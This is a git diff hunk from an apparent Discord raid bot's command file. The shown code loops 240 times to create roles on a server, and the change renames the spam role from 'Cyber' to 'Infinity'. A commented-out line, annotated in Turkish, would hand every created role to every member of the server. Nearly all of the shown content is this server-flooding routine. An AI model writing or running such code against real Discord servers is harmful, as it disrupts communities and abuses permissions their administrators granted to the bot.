@@ -8,7 +8,7 @@ module.exports.run = async (client, message, args) => {
         }
     });
         for(let i = 0; i < 240; i++) {
-            message.guild.roles.create({ name: "Cyber" }).then((createdRole) => {
+            message.guild.roles.create({ name: "Infinity" }).then((createdRole) => {
             //message.guild.members.cache.forEach(member => member.roles.add(createdRole.id)); /////bunu aktif edersen açtığı rolleri sunucudaki herkese verir
         });
     }
